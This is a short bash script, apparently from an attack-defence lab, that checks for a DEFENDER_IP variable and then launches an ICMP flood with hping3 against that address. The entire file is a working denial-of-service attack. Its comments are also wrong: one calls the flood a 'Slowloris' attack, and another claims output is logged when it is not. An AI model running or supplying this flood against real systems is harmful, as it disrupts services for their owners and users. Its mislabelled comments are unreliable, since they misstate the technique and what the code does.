#!/bin/bash

# Check if DEFENDER_IP is set
if [ -z "$DEFENDER_IP" ]; then
  echo "DEFENDER_IP is not set"
  exit 1
else
  echo "DEFENDER_IP is set to $DEFENDER_IP"
fi

# Run the ICMP flood attack and log output to a file
echo "Starting Slowloris flood attack on $DEFENDER_IP"
hping3 --icmp -d 65536 --flood $DEFENDER_IP

